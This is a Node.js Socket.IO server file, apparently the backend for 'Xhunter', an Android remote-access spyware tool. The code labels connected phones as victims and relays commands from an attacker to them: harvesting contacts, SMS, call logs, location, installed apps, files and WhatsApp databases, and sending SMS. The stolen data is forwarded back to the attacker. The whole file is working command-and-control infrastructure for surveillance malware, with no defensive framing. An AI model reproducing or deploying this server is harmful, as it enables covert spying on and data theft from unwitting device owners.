const express = require('express');
const app = express();
const server = require('http').createServer(app);
const { Server } = require('socket.io');
const io = new Server(server, {
  maxHttpBufferSize: 1e8, // 100MB
});

var victimList = {};
var deviceList = {};
var victimData = {};
var adminSocketId = null;

// Use Render's PORT or fallback to 8080
const PORT = process.env.PORT || 8080;

// Root route — MUST be BEFORE listen
app.get('/', (req, res) => {
  res.send('Welcome to Xhunter Backend Server!!');
});

// Start server
server.listen(PORT, () => {
  console.log(`Server Started on port ${PORT}`);
});

// Socket.IO Logic
io.on('connection', (socket) => {
  socket.on('adminJoin', () => {
    adminSocketId = socket.id;
    if (Object.keys(victimData).length > 0) {
      Object.keys(victimData).map((key) => socket.emit("join", victimData[key]));
    }
  });

  socket.on('request', request); // from attacker
  socket.on('join', (device) => {
    console.log("Victim joined => socketId " + socket.id);
    victimList[device.id] = socket.id;
    victimData[device.id] = { ...device, socketId: socket.id };
    deviceList[socket.id] = {
      "id": device.id,
      "model": device.model
    };
    socket.broadcast.emit("join", { ...device, socketId: socket.id });
  });

  socket.on('getDir', (data) => response("getDir", data));
  socket.on('getInstalledApps', (data) => response("getInstalledApps", data));
  socket.on('getContacts', (data) => response("getContacts", data));
  socket.on('sendSMS', (data) => response("sendSMS", data));
  socket.on('getCallLog', (data) => response("getCallLog", data));
  socket.on("previewImage", (data) => response("previewImage", data));
  socket.on("error", (data) => response("error", data));
  socket.on("getSMS", (data) => response("getSMS", data));
  socket.on('getLocation', (data) => response("getLocation", data));

  socket.on('disconnect', () => {
    if (socket.id === adminSocketId) {
      adminSocketId = null;
    } else {
      response("disconnectClient", socket.id);
      Object.keys(victimList).map((key) => {
        if (victimList[key] === socket.id) {
          delete victimList[key];
          delete victimData[key];
        }
      });
    }
  });

  socket.on("download", (d, callback) => responseBinary("download", d, callback));
  socket.on("downloadWhatsappDatabase", (d, callback) => {
    socket.broadcast.emit("downloadWhatsappDatabase", d, callback);
  });
});

// Request from attacker → victim
const request = (d) => {
  let { to, action, data } = JSON.parse(d);
  console.log("Requesting action: " + action);
  io.to(victimList[to]).emit(action, data);
};

// Response from victim → attacker
const response = (action, data) => {
  if (adminSocketId) {
    console.log("response action: " + action);
    io.to(adminSocketId).emit(action, data);
  }
};

const responseBinary = (action, data, callback) => {
  if (adminSocketId) {
    console.log("response action: " + action);
    callback("success");
    io.to(adminSocketId).emit(action, data);
  }
};
